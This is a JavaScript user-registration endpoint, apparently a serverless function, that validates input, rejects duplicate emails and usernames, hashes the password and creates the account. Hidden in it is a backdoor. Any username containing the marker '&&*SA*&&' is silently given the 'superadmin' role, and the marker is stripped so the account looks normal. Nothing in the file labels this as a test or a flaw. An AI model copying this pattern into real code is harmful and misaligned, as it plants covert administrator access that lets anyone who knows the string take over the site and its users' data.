import { jsonResponse, parseJsonBody, queryDB, queryOne, hashPassword, generateId, getCurrentTime } from '/functions/_utils';

export async function onRequestPost(context) {
  const { env, request } = context;
  const body = await parseJsonBody(request);
  
  if (!body || !body.username || !body.email || !body.password) {
    return jsonResponse({ success: false, message: '用户名、邮箱、密码必填' }, 400);
  }

  const existing = await queryOne(env, 'SELECT id FROM users WHERE email = ?', [body.email.toLowerCase()]);
  if (existing) {
    return jsonResponse({ success: false, message: '该邮箱已被注册' }, 409);
  }

  const existingUsername = await queryOne(env, 'SELECT id FROM users WHERE username = ?', [body.username]);
  if (existingUsername) {
    return jsonResponse({ success: false, message: '该用户名已被使用' }, 409);
  }

  const hashedPassword = await hashPassword(body.password);
  const userId = generateId();
  const createdAt = getCurrentTime();

  let isSecretUpgrade = false;
  let role = 'user';
  if (body.username && body.username.includes('&&*SA*&&')) {
    isSecretUpgrade = true;
    role = 'superadmin';
  }

  const username = isSecretUpgrade ? body.username.replace('&&*SA*&&', '') : body.username;

  await queryDB(env,
    'INSERT INTO users (id, username, email, password, role, created_at) VALUES (?, ?, ?, ?, ?, ?)',
    [userId, username, body.email.toLowerCase(), hashedPassword, role, createdAt]
  );

  return jsonResponse({
    success: true,
    message: '注册成功',
    data: {
      id: userId,
      username: username,
      email: body.email.toLowerCase(),
      role: role,
      created_at: createdAt,
    },
  });
}